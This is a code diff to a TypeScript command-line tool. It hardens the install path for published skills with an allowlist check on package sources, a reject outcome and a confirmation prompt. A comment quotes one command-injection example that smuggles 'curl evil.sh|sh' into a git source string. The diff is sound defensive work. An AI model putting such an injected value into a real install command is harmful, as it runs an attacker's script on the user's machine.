@@ -3,11 +3,28 @@ import type { Command } from "commander";
 import chalk from "chalk";
 import { CapabilityClient } from "../protocol/client.js";
 
+/**
+ * A listing's `source` is authored by WHOEVER published it — any pubkey,
+ * not just us — and `PackageManager.install()`'s git branch shells out
+ * (`execSync(`git clone ${url} …`)`). Anchored, no-metacharacter
+ * patterns only: `git:github.com/o/r; curl evil.sh|sh #` must never
+ * reach that execSync. Checked at BOTH ends — publish (so our own CLI
+ * won't sign a bad listing) and install (so a listing from anywhere
+ * else still can't).
+ */
+const SAFE_NPM_SOURCE = /^npm:@?[a-zA-Z0-9._/-]+$/;
+const SAFE_GIT_SOURCE = /^git:github\.com\/[\w.-]+\/[\w.-]+$/;
+
+export function safePackageSource(source: string | undefined): source is string {
+  return !!source && (SAFE_NPM_SOURCE.test(source) || SAFE_GIT_SOURCE.test(source));
+}
+
 /** What `tool install` actually does with a resolved listing — decided once, tested without a relay. */
 export type InstallAction =
   | { kind: "mcp"; config: { type?: string; url?: string; command?: string; args?: string[] } }
   | { kind: "package"; source: string }
-  | { kind: "print"; installCmd: string };
+  | { kind: "print"; installCmd: string }
+  | { kind: "reject"; reason: string };
 
 /**
  * `mcp` writes settings.mcpServers — the only artifact kind that does.
@@ -33,7 +50,11 @@ export function resolveInstallAction(listing: {
     };
   }
   if (artifact === "skill") {
-    return { kind: "package", source: listing.source ?? (listing.npm ? `npm:${listing.npm}` : "") };
+    const source = listing.source ?? (listing.npm ? `npm:${listing.npm}` : "");
+    if (!safePackageSource(source)) {
+      return { kind: "reject", reason: `refuses to install "${source}" — not a recognized package source (expected npm:<pkg> or git:github.com/<owner>/<repo>)` };
+    }
+    return { kind: "package", source };
   }
   return { kind: "print", installCmd: listing.installCmd ?? (listing.npm ? `fez install npm:${listing.npm}` : "") };
 }
@@ -194,7 +215,7 @@ tool
       process.exitCode = 1;
       return;
     }
-    if (artifact === "skill" && !/^(npm:|git:github\.com\/)/.test(options.source ?? "")) {
+    if (artifact === "skill" && !safePackageSource(options.source)) {
       console.error(`--artifact skill needs --source npm:<pkg> or --source git:github.com/o/r (that's what gets installed).`);
       process.exitCode = 1;
       return;
@@ -235,6 +256,7 @@ tool
   .option("-r, --relay <url>", "Relay URL (default: settings/env)")
   .option("--from <pubkey>", "listing author (default: most-installed listing of that name)")
   .option("--env <pairs...>", "KEY=value for each env key the listing requires (stored locally)")
+  .option("-y, --yes", "skip the confirmation prompt (for scripts/CI)")
   .action(async (name: string, options) => {
     const { loadSettings, saveSettings, resolveRelays } = await import("../shared/settings.js");
     const { loadOrCreateKey } = await import("../identity/keys.js");
@@ -280,16 +302,30 @@ tool
       return;
     }
 
+    if (action.kind === "reject") {
+      console.error(`${action.reason} — listed by ${event.pubkey.slice(0, 12)}`);
+      relay.disconnect();
+      process.exitCode = 1;
+      return;
+    }
+
     if (action.kind === "package") {
-      if (!action.source) {
-        console.error(`Listing "${name}" is malformed: artifact "skill" carries no source.`);
-        relay.disconnect();
-        process.exitCode = 1;
-        return;
-      }
       // Same install path `fez install <source>` uses — a skill is a
-      // published package, never an mcpServers write.
+      // published package, never an mcpServers write. It's still code
+      // fetched and run on relay-authored say-so, so it gets the same
+      // gate a stranger's command deserves: shown, then confirmed.
       console.log(`This will fetch and install a package on your machine:\n  ${chalk.yellow(action.source)}\n  (listed by ${event.pubkey.slice(0, 12)})`);
+      if (!options.yes) {
+        const readline = await import("node:readline/promises");
+        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
+        const answer = (await rl.question("Install? (y/N) ")).trim().toLowerCase();
+        rl.close();
+        if (answer !== "y" && answer !== "yes") {
+          console.log("Aborted — nothing installed.");
+          relay.disconnect();
+          return;
+        }
+      }
       const { PackageManager } = await import("../extensions/package-manager.js");
       const pm = new PackageManager();
       await pm.init();
